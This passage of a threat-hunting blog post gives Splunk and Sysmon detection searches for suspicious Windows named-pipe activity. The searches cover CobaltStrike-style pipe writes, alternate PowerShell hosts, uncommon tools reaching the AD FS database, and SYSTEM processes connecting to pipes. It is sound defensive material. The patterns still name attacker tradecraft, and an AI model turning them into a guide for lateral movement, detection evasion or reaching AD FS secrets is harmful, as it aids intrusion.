class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">While writing this detection, I discovered a valuable Lateral Movement <a class="ah qr" href="https://bherunda.medium.com/hunting-detecting-smb-named-pipe-pivoting-lateral-movement-b4382bd1df4" rel="noopener">hunting guide</a> by <span class="hl"><span class="bn" role="tooltip" aria-describedby="10" aria-labelledby="10"></span></span></p><div tabindex="-1" class="bf"><a class="rx ry fl" href="https://medium.com/u/82e590612eeb?source=post_page---user_mention--a4206e8a4bc8---------------------------------------" rel="noopener" target="_blank">Ankith Bharadwaj</a></div> that also mentions named pipes and includes other hunting searches worth reading :)<p></p><h3 id="0aec" class="rp pr ja bg ps gx rq ef gy gz rr eh ha hb rs hc hd he rt hf hg hh ru hi hj rv bl" data-selectable-paragraph="">Suspicious communication with Pipes in command lines</h3><pre class="qx qy qz ra rb sm qv sn bq so bc bl"><span id="468b" class="sp pr ja qv b bh sq sr m ss st" data-selectable-paragraph="">`wineventlog`<br>signature_id IN (1,4688)<br>process IN<br>  (<br>  "*echo * &gt; \\\\.\\Pipe\\*",<br>  "*copy * \\\\.\\Pipe\\*",<br>  "*type * &gt; \\\\.\\Pipe\\*"<br>  )</span></pre><p id="5f60" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">This search is designed to detect potentially suspicious command line activities involving named pipes, a technique commonly used in various attack frameworks, including CobaltStrike. By focusing on specific commands (<code class="de qs qt qu qv b">echo</code>, <code class="de qs qt qu qv b">copy</code>, <code class="de qs qt qu qv b">type</code>) that interact with named pipes, aiming to identify behaviors that may indicate privilege escalation</p><h3 id="445d" class="rp pr ja bg ps gx rq ef gy gz rr eh ha hb rs hc hd he rt hf hg hh ru hi hj rv bl" data-selectable-paragraph="">Pipes events from suspicious directories</h3><p id="1816" class="pw-post-body-paragraph ov ow ja ox b oy qm pa pb pc qn pe pf hb qo ph pi he qp pk pl hh qq pn po pp ib bl" data-selectable-paragraph="">This search detect potentially malicious activities by monitoring named pipe events in directories often used by attackers.</p><pre class="qx qy qz ra rb sm qv sn bq so bc bl"><span id="f80a" class="sp pr ja qv b bh sq sr m ss st" data-selectable-paragraph="">`sysmon`<br>signature_id IN (17,18)<br>process_path IN<br>  (<br>    "*:\\Temp\\*", <br>    "*:\\Windows\\Temp\\*", <br>    "*:\\AppData\\Local\\Temp\\*", <br>    "*:\\ProgramData\\*", <br>    "*:\\Users\\Public\\*"<br>  )</span></pre><h3 id="018e" class="rp pr ja bg ps gx rq ef gy gz rr eh ha hb rs hc hd he rt hf hg hh ru hi hj rv bl" data-selectable-paragraph="">Suspicious Powershell hosts</h3><pre class="qx qy qz ra rb sm qv sn bq so bc bl"><span id="0d24" class="sp pr ja qv b bh sq sr m ss st" data-selectable-paragraph="">`sysmon`<br>signature_id=17<br>pipe_name="\\PSHost*"<br>NOT (Image IN (<br>    "*:\\Program Files\\PowerShell\\7-preview\\pwsh.exe",<br>    "*:\\Program Files\\PowerShell\\7\\pwsh.exe",<br>    "*:\\Windows\\system32\\dsac.exe",<br>    "*:\\Windows\\system32\\inetsrv\\w3wp.exe",<br>    "*:\\Windows\\System32\\sdiagnhost.exe",<br>    "*:\\Windows\\system32\\ServerManager.exe",<br>    "*:\\Windows\\system32\\wbem\\wmiprvse.exe",<br>    "*:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe",<br>    "*:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",<br>    "*:\\Windows\\System32\\wsmprovhost.exe",<br>    "*:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell_ise.exe",<br>    "*:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",<br>    "*:\\Program Files\\Microsoft SQL Server\\*\\Tools\\Binn\\SQLPS.exe",<br>    "*:\\Program Files\\Citrix\\*",<br>    "*:\\Program Files\\Microsoft\\Exchange Server\\*"<br>))</span></pre><p id="19e4" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">There is a <a class="ah qr" href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/pipe_created/pipe_created_powershell_alternate_host_pipe.yml" rel="noopener ugc nofollow" target="_blank">sigma rule</a> for everything now 🎉<br>This search helps identifies alternative PowerShell hosts that may evade detections (pipe not matching known legitimate processes, indicating potential misuse or anomalous activity)</p><p id="3863" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph=""><mark class="abh abi aq">Testing </mark>this with the famous tool <a class="ah qr" href="https://github.com/p3nt4/PowerShdll" rel="noopener ugc nofollow" target="_blank">Powershdll</a> and we have a match :)</p></div></div><div class="op bi"><figure class="qx qy qz ra rb op bi paragraph-image"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*EUAbYPqrKZu761ATwxHCag.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*EUAbYPqrKZu761ATwxHCag.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*EUAbYPqrKZu761ATwxHCag.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*EUAbYPqrKZu761ATwxHCag.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*EUAbYPqrKZu761ATwxHCag.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*EUAbYPqrKZu761ATwxHCag.png 1100w, https://miro.medium.com/v2/resize:fit:3590/format:webp/1*EUAbYPqrKZu761ATwxHCag.png 3590w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1795px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*EUAbYPqrKZu761ATwxHCag.png 640w, https://miro.medium.com/v2/resize:fit:720/1*EUAbYPqrKZu761ATwxHCag.png 720w, https://miro.medium.com/v2/resize:fit:750/1*EUAbYPqrKZu761ATwxHCag.png 750w, https://miro.medium.com/v2/resize:fit:786/1*EUAbYPqrKZu761ATwxHCag.png 786w, https://miro.medium.com/v2/resize:fit:828/1*EUAbYPqrKZu761ATwxHCag.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*EUAbYPqrKZu761ATwxHCag.png 1100w, https://miro.medium.com/v2/resize:fit:3590/1*EUAbYPqrKZu761ATwxHCag.png 3590w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1795px"><img alt="" class="bi gl ou c" width="1795" height="274" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1795/1*EUAbYPqrKZu761ATwxHCag.png"></picture></figure></div><div class="ac ci"><div class="cp bi ih ii ij ik"><h3 id="eafa" class="rp pr ja bg ps gx rq ef gy gz rr eh ha hb rs hc hd he rt hf hg hh ru hi hj rv bl" data-selectable-paragraph="">ADFS Database Named Pipe Connection By Uncommon Tool</h3><pre class="qx qy qz ra rb sm qv sn bq so bc bl"><span id="a4f1" class="sp pr ja qv b bh sq sr m ss st" data-selectable-paragraph="">`sysmon`<br>signature_id IN (17,18)<br>pipe_name="\\MICROSOFT##WID\\tsql\\query"<br>NOT (<br>    Image IN (<br>        "*:\\Windows\\System32\\mmc.exe",<br>        "*:\\Windows\\system32\\svchost.exe",<br>        "*:\\Windows\\System32\\wsmprovhost.exe",<br>        "*:\\Windows\\SysWOW64\\mmc.exe",<br>        "*:\\Windows\\SysWOW64\\wsmprovhost.exe",<br>        "*:\\Windows\\WID\\Binn\\sqlwriter.exe",<br>        "*\\AzureADConnect.exe",<br>        "*\\Microsoft.Identity.Health.Adfs.PshSurrogate.exe",<br>        "*\\Microsoft.IdentityServer.ServiceHost.exe",<br>        "*\\Microsoft.Tri.Sensor.exe",<br>        "*\\sqlservr.exe",<br>        "*\\tssdis.exe"<br>    )<br>)</span></pre><p id="c903" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">From a <a class="ah qr" href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/pipe_created/pipe_created_adfs_namedpipe_connection_uncommon_tool.yml" rel="noopener ugc nofollow" target="_blank">sigma rule</a> by <a class="ah qr" href="http://twitter.com/Cyb3rWard0g" rel="noopener ugc nofollow" target="_blank">@Cyb3rWard0g</a> that detects suspicious local connections to the AD FS configuration database !</p><h3 id="91be" class="rp pr ja bg ps gx rq ef gy gz rr eh ha hb rs hc hd he rt hf hg hh ru hi hj rv bl" data-selectable-paragraph="">Uncommon Named Pipes Detection</h3><p id="5f02" class="pw-post-body-paragraph ov ow ja ox b oy qm pa pb pc qn pe pf hb qo ph pi he qp pk pl hh qq pn po pp ib bl" data-selectable-paragraph="">Incorporating the usual behavior of certain processes can help us identify anomalies when those processes use unexpected named pipes. For instance, if <code class="de qs qt qu qv b">powershell.exe</code> creates a named pipe other than an anonymous pipe or the <code class="de qs qt qu qv b">\PSHost*</code> pipe, it might be suspicious and worth investigating. This approach is primarily for threat hunting and large-scale triage, provided you have sufficient telemetry. It will likely generate a substantial volume of results to review.</p><p id="a5fc" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph=""><strong class="ox jb">Initial Search: Collect Named Pipe Relationships in Your Environment</strong></p><p id="2ebc" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">Run the following search once every three months to gather named pipe relationships. Note that this search may take some time to complete:</p><pre class="qx qy qz ra rb sm qv sn bq so bc bl"><span id="95fd" class="sp pr ja qv b bh sq sr m ss st" data-selectable-paragraph="">`sysmon` signature_id IN (17,18) earliest=-90d latest=now<br>[| inputlookup named_pipes_list.csv |  fields - metadata_*]<br>NOT [| inputlookup named_pipes_exclusions.csv |fields - metadata_*]<br>| fields pipe_name process_path signature_id<br>| dedup pipe_name process_path signature_id<br>| collect index=known_named_pipes_relation sourcetype=stash</span></pre><p id="51e8" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph=""><code class="de qs qt qu qv b"><em class="sl">named_pipes_list.csv</em></code><em class="sl">contains a list of named pipes or process paths we want to monitor and</em><code class="de qs qt qu qv b"><em class="sl">named_pipes_execlusions.csv</em></code><em class="sl"> contains default exclusions for name pipes pattern as some will contain random strings after a static pattern, several default exclusions are necessary, search without the lookups first to have an idea of which named pipes are used in your environment and which ones will need an exclusion</em></p><p id="b3e5" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph=""><strong class="ox jb">Second Search: Identify Unknown Named Pipes Patterns by Known Processes</strong></p><pre class="qx qy qz ra rb sm qv sn bq so bc bl"><span id="89c4" class="sp pr ja qv b bh sq sr m ss st" data-selectable-paragraph=""> `sysmon` signature_id IN (17,18)<br>NOT [| inputlookup named_pipes_exclusions.csv |fields - metadata_*]<br>| search<br>  NOT [| search index=known_named_pipes_relation sourcetype=stash<br>       earliest=-90d latest=now<br>       |fields pipe_name process_path signature_id]<br>| stats count<br>  earliest(_time) as firsttime<br>  latest(_time) as lasttime<br>  by src_nt_host src_user pipe_name process_path signature_id index sourcetype<br>| sort - count</span></pre><p id="5398" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph=""><strong class="ox jb">Uncommon Named pipes Execution via IPC$ with EID 5145</strong></p><p id="cc34" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">Seeing <strong class="ox jb"><em class="sl">IPC$</em></strong> in the share path of a Microsoft Event ID <a class="ah qr" href="https://github.com/mthcht/awesome-lists/blob/main/Lists/wineventlogs/EventIDs/Security-5145.md" rel="noopener ugc nofollow" target="_blank"><strong class="ox jb">5145 </strong></a>typically indicates an attempt to access the inter-process communication share on a Windows machine. While this activity is often legitimate, it could also indicate a lateral movement within the network.</p><p id="3423" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">The <strong class="ox jb">relativeTargetName </strong>field will contain the specific named pipe used. Similar to the two searches mentioned above, you can gather and analyze the named pipe relationships in your environment by monitoring the <strong class="ox jb">IPC$</strong> share path used with the EventID <a class="ah qr" href="https://github.com/mthcht/awesome-lists/blob/main/Lists/wineventlogs/EventIDs/Security-5145.md" rel="noopener ugc nofollow" target="_blank"><strong class="ox jb">5145</strong></a>. This allows you to detect and flag any uncommon or suspicious named pipes associated with the IPC$ share.</p><h3 id="4794" class="rp pr ja bg ps gx rq ef gy gz rr eh ha hb rs hc hd he rt hf hg hh ru hi hj rv bl" data-selectable-paragraph="">Suspicious process running as SYSTEM connecting to Named Pipes</h3><pre class="qx qy qz ra rb sm qv sn bq so bc bl"><span id="75c9" class="sp pr ja qv b bh sq sr m ss st" data-selectable-paragraph="">`sysmon`<br>signature_id=18<br>src_user_id="S-1–5–18"<br>process_name IN (powershell.exe, powershell_ise.exe, cmd.exe, wmiprvse.exe, spoolsv.exe, rundll32.exe, wscript.exe, cscript.exe, mshta.exe)</span></pre><p id="2945" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">It could help detect some Named Pipe exploitations, it’s better to use the user SID instead of the username, as usernames can vary with system language settings.</p></div></div></div><div class="ac ci rz sa sb sc" role="separator"><span class="sd by bn go se sf"></span><span class="sd by bn go se sf"></span><span class="sd by bn go se"></span></div><div class="ib iu iv iw ix"><div class="ac ci"><div class="cp bi ih ii ij ik"><p id="a8c8" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl sv" data-selectable-paragraph=""><span class="m sw sx sy bp sz ta tb tc td fr">B</span>esides these specific searches with named pipe, I don’t have additional hunting searches to recommend at this time. Establishing a baseline and detecting anomalies with these logs is challenging, and you may not have sufficient telemetry (depending on your environment). Collecting such data on a large scale with Sysmon without filters can result in overwhelming volumes of data. Instead, I prefer focusing on known malicious and suspicious named pipes using <a class="ah qr" href="https://github.com/mthcht/awesome-lists/blob/main/Lists/suspicious_named_pipe_list.csv" rel="noopener ugc nofollow" target="_blank">my list</a> and some other known named pipe associated with various protocols (SMB, RPC, SQL…). You can adapt your Sysmon configuration to include all the pipe names in my list if you want to really control the verbosity.</p><pre class="qx qy qz ra rb sm qv sn bq so bc bl"><span id="bcb8" class="sp pr ja qv b bh sq sr m ss st" data-selectable-paragraph="">    &lt;PipeEvent onmatch="include"&gt;<br>      &lt;PipeName condition="is"&gt;...</span></pre><p id="df6c" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">I hope you’ll find <a class="ah qr" href="https://github.com/mthcht/awesome-lists/blob/main/Lists/suspicious_named_pipe_list.csv" rel="noopener ugc nofollow" target="_blank">the list</a> and the hunting searches valuable. Your feedback is always welcome!</p><figure class="qx qy qz ra rb op oh oi paragraph-image"><div role="button" tabindex="0" class="oq or fr os bi ot"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="oh oi vi"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*teLBKmWvGQDxYdAdpdn28g.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*teLBKmWvGQDxYdAdpdn28g.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*teLBKmWvGQDxYdAdpdn28g.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*teLBKmWvGQDxYdAdpdn28g.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*teLBKmWvGQDxYdAdpdn28g.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*teLBKmWvGQDxYdAdpdn28g.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*teLBKmWvGQDxYdAdpdn28g.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*teLBKmWvGQDxYdAdpdn28g.png 640w, https://miro.medium.com/v2/resize:fit:720/1*teLBKmWvGQDxYdAdpdn28g.png 720w, https://miro.medium.com/v2/resize:fit:750/1*teLBKmWvGQDxYdAdpdn28g.png 750w, https://miro.medium.com/v2/resize:fit:786/1*teLBKmWvGQDxYdAdpdn28g.png 786w, https://miro.medium.com/v2/resize:fit:828/1*teLBKmWvGQDxYdAdpdn28g.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*teLBKmWvGQDxYdAdpdn28g.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*teLBKmWvGQDxYdAdpdn28g.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi gl ou c" width="700" height="389" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*teLBKmWvGQDxYdAdpdn28g.png"></picture></div></div></figure><p id="7a12" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">Happy Hunting !</p></div></div></div></div></section></div></div></article></div><div class="ac ci"><div class="cp bi ih ii ij ik"><div class="vj vk ac kx"><div class="vd ac"><a class="vl ak ao aq" href="https://medium.com/tag/threat-hunting?source=post_page-----a4206e8a4bc8---------------------------------------" rel="noopener follow"><div class="uu fr de vm im vn vo bg b bh ab bl gc">Threat Hunting</div></a></div><div class="vd ac"><a class="vl ak ao aq" href="https://medium.com/tag/threat-intelligence?source=post_page-----a4206e8a4bc8---------------------------------------" rel="noopener follow"><div class="uu fr de vm im vn vo bg b bh ab bl gc">Threat Intelligence</div></a></div><div class="vd ac"><a class="vl ak ao aq" href="https://medium.com/tag/named-pipes?source=post_page-----a4206e8a4bc8---------------------------------------" rel="noopener follow"><div class="uu fr de vm im vn vo bg b bh ab bl gc">Named Pipes</div></a></div><div class="vd ac"><a class="vl ak ao aq" href="https://medium.com/tag/dfir?source=post_page-----a4206e8a4bc8---------------------------------------" rel="noopener follow"><div class="uu fr de vm im vn vo bg b bh ab bl gc">Dfir</div></a></div><div class="vd ac"><a class="vl ak ao aq" href="https://medium.com/tag/splunk?source=post_page-----a4206e8a4bc8---------------------------------------" rel="noopener follow"><div class="uu fr de vm im vn vo bg b bh ab bl gc">Splunk</div></a></div></div></div></div><div class="m"></div><div class="wd m"><div class="ac ci"><div class="cp bi ih ii ij ik"><div class="we m"><div class="ac kk ki kg uc tz"><div class="wf wg wh wi wj wk wl wm wn wo ac cw"><div class="i l"><a href="https://detect.fyi/?source=post_page---post_publication_info--a4206e8a4bc8---------------------------------------" rel="noopener follow"><div class="fr"><img alt="Detect FYI" class="de hw m wq wp" width="48" height="48" loading="lazy" src="https://miro.medium.com/v2/resize:fill:48:48/1*ayMhoNccbO0IxQ1UPFv0SA.png"><div class="hw m wp wq fw o gj hz"></div></div></a></div><div class="k j e"><a href="https://detect.fyi/?source=post_page---post_publication_info--a4206e8a4bc8---------------------------------------" rel="noopener follow"><div class="fr"><img alt="Detect FYI" class="de hw m ws wr" width="64" height="64" loading="lazy" src="https://miro.medium.com/v2/resize:fill:64:64/1*ayMhoNccbO0IxQ1UPFv0SA.png"><div class="hw m wr ws fw o gj hz"></div></div></a></div><div class="k j e us cb"><div class="ac"><button class="ya yb aq ac ci r yc mf yd" style="border: 1px solid rgba(26, 26, 26, 0.725);"><span class="bg b bh ab bl bi"><span class="bn ye">Follow</span></span></button></div></div></div><div class="ac cv cd"><div class="wt wu wv ww wx m"><a class="ah ai aj al am an ao ap aq ar as at au av ac r" href="https://detect.fyi/?source=post_page---post_publication_info--a4206e8a4bc8---------------------------------------" rel="noopener follow"><h2 class="pw-author-name bg gw wz xa xb xc xd xe hb hc hd he hf hg hh hi hj bl"><span class="ib wy">Published in Detect FYI</span></h2></a><div class="vd ac km"><div class="m cb"><span class="pw-follower-count bg b bh ab eb"><a class="ah ai aj fo al am an ao ap aq ar as at kv" rel="noopener follow" href="https://detect.fyi/followers?source=post_page---post_publication_info--a4206e8a4bc8---------------------------------------" data-discover="true">2.5K followers</a></span></div><div class="bg b bh ab eb ac xf"><span class="hk m" aria-hidden="true"><span class="bg b bh ab eb">·</span></span><a class="ah ai aj fo al am an ao ap aq ar as at kv" rel="noopener follow" href="https://detect.fyi/detection-satelital-dll-sideloading-via-mfc-turla-s-kazuar-v3-3de2fbd2d6af?source=post_page---post_publication_info--a4206e8a4bc8---------------------------------------" data-discover="true">Last published&nbsp;1 day ago</a></div></div><div class="ia m"><p class="bg b bh ab bl"><span class="ib">Threat Detection Engineering and DFIR Insights</span></p></div></div></div><div class="i l"><div class="ac"><button class="ya yb aq ac ci r yc mf yd" style="border: 1px solid rgba(26, 26, 26, 0.725);"><span class="bg b bh ab bl bi"><span class="bn ye">Follow</span></span></button></div></div></div></div><div class="ac kk ki kg uc tz"><div class="wf wg wh wi wj wk wl wm wn wo ac cw"><div class="i l"><a tabindex="0" href="https://mthcht.medium.com/?source=post_page---post_author_info--a4206e8a4bc8---------------------------------------" rel="noopener follow"><div class="m fr"><img alt="mthcht" class="m fk by wp wq de" width="48" height="48" loading="lazy" src="https://miro.medium.com/v2/resize:fill:48:48/1*h7dUyUQgUIrGSCgdizGKYw.png"><div class="gj by m wp wq fw o ak hz"></div></div></a></div><div class="k j e"><a tabindex="0" href="https://mthcht.medium.com/?source=post_page---post_author_info--a4206e8a4bc8---------------------------------------" rel="noopener follow"><div class="m fr"><img alt="mthcht" class="m fk by wr ws de" width="64" height="64" loading="lazy" src="https://miro.medium.com/v2/resize:fill:64:64/1*h7dUyUQgUIrGSCgdizGKYw.png"><div class="gj by m wr ws fw o ak hz"></div></div></a></div><div class="k j e us cb"><div class="ac"><button class="ya yb aq ac ci r yc mf yd" style="border: 1px solid rgba(16, 16, 16, 0.435);"><span class="bg b bh ab bl bi"><span class="bn ye">Follow</span></span></button></div></div></div><div class="ac cv cd"><div class="wt wu wv ww wx m"><a class="ah ai aj al am an ao ap aq ar as at au av ac r" href="https://mthcht.medium.com/?source=post_page---post_author_info--a4206e8a4bc8---------------------------------------" rel="noopener follow"><h2 class="pw-author-name bg gw wz xa xb xc xd xe hb hc hd he hf hg hh hi hj bl"><span class="ib wy">Written by mthcht</span></h2></a><div class="vd ac km"><div class="m cb"><span class="pw-follower-count bg b bh ab eb"><a class="ah ai aj fo al am an ao ap aq ar as at kv" href="https://mthcht.medium.com/followers?source=post_page---post_author_info--a4206e8a4bc8---------------------------------------" rel="noopener follow">848 followers</a></span></div><div class="bg b bh ab eb ac xf"><span class="hk m" aria-hidden="true"><span class="bg b bh ab eb">·</span></span><a class="ah ai aj fo al am an ao ap aq ar as at kv" href="https://medium.com/@mthcht/following?source=post_page---post_author_info--a4206e8a4bc8---------------------------------------" rel="noopener follow">64 following</a></div></div><div class="ia m"><p class="bg b bh ab bl"><span class="ib">Threat Hunting - DFIR - Detection Engineering</span></p></div></div></div><div class="i l"><div class="ac"><button class="ya yb aq ac ci r yc mf yd" style="border: 1px solid rgba(16, 16, 16, 0.435);"><span class="bg b bh ab bl bi"><span class="bn ye">Follow</span></span></button></div></div></div></div></div></div><div class="xg m"><div class="xh bi s wd"></div><div class="ac ci"><div class="cp bi ih ii ij ik"><div class="ac r cw"><h2 class="bg gw pt pv gy pw py ha pz qb qc qd qf qg qh qj qk bl">No responses yet</h2><div class="ac xi"><div><div class="bn" role="tooltip" aria-describedby="16" aria-labelledby="16"><div tabindex="-1" class="bf"><a class="xj xk" href="https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page---post_responses--a4206e8a4bc8---------------------------------------" rel="noopener follow" target="_blank"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" aria-label="Shield with a checkmark" viewBox="0 0 25 25"><path fill-rule="evenodd" d="M11.987 5.036a.754.754 0 0 1 .914-.01c.972.721 1.767 1.218 2.6 1.543.828.322 1.719.485 2.887.505a.755.755 0 0 1 .741.757c-.018 3.623-.43 6.256-1.449 8.21-1.034 1.984-2.662 3.209-4.966 4.083a.75.75 0 0 1-.537-.003c-2.243-.874-3.858-2.095-4.897-4.074-1.024-1.951-1.457-4.583-1.476-8.216a.755.755 0 0 1 .741-.757c1.195-.02 2.1-.182 2.923-.503.827-.322 1.6-.815 2.519-1.535m.468.903c-.897.69-1.717 1.21-2.623 1.564-.898.35-1.856.527-3.026.565.037 3.45.469 5.817 1.36 7.515.884 1.684 2.25 2.762 4.284 3.571 2.092-.81 3.465-1.89 4.344-3.575.886-1.698 1.299-4.065 1.334-7.512-1.149-.039-2.091-.217-2.99-.567-.906-.353-1.745-.873-2.683-1.561m-.009 9.155a2.672 2.672 0 1 0 0-5.344 2.672 2.672 0 0 0 0 5.344m0 1a3.672 3.672 0 1 0 0-7.344 3.672 3.672 0 0 0 0 7.344m-1.813-3.777.525-.526.916.917 1.623-1.625.526.526-2.149 2.152z" clip-rule="evenodd"></path></svg></a></div></div></div></div></div><div class="xl xm xn xo xp m"><div><div class="bg b bh ab bl"><div class="hn"><div class="zo m"><div class="zp ac r"><div class="m fr"><img alt="" class="m fk by bz ca de" width="32" height="32" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png"><div class="gj by m bz ca fw o ak hz"></div></div><div class="bo ac cu cv ci"><p class="bg b bh ab eb">Write a response</p></div></div><div class="de bq ac cv zh zi"><div class="ac cv fr"><span data-dd-action-name="Susi presentation tracker respond_sidebar"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://medium.com/m/signin?operation=register&amp;redirect=https%3A%2F%2Fdetect.fyi%2Fthreat-hunting-suspicious-named-pipes-a4206e8a4bc8&amp;source=---post_responses--a4206e8a4bc8---------------------respond_sidebar------------------" rel="noopener follow"><div class="uf m"><p class="bg b bh ab eb">What are your thoughts?</p></div></a></span><div class="cw zj eb ac zk ht zl"><span class="bg b bh ab eb"><div class="ac"><div><div class="bn" aria-describedby="33" aria-labelledby="33" role="tooltip"><div tabindex="-1" class="bf"><span role="button" aria-label="Bold (⌘B)" class="zq zr zs zt bq nj ci zu zv zw" tabindex="0"><svg width="21" height="21"><path fill-rule="evenodd" d="M10.308 17.993h-5.92l.11-.894.783-.12c.56-.11.79-.224.79-.448V5.37c0-.225-.113-.336-.902-.448H4.5l-.114-.894h6.255c4.02 0 5.58 1.23 5.58 3.13 0 1.896-1.78 3.125-3.79 3.463v.11c2.69.34 4.25 1.56 4.25 3.57 0 2.35-2.01 3.69-6.37 3.69l.02.01h-.02zm-.335-12.96H8.967V10.5h1.23c1.788 0 2.79-1.23 2.79-2.683 0-1.685-1.004-2.803-3.006-2.803v.02zm-.223 6.36h-.783v5.588l1.225.23h.22c1.67 0 3.01-1.004 3.01-2.792 0-2.122-1.566-3.016-3.69-3.016h.018z"></path></svg></span></div></div></div><div><div class="bn" aria-describedby="34" aria-labelledby="34" role="tooltip"><div tabindex="-1" class="bf"><span role="button" aria-label="Italic (⌘I)" class="zq zr zs zt bq nj ci zu zv zw" tabindex="0"><svg width="21" height="21"><path fill-rule="evenodd" d="M9.847 18.04c-.533 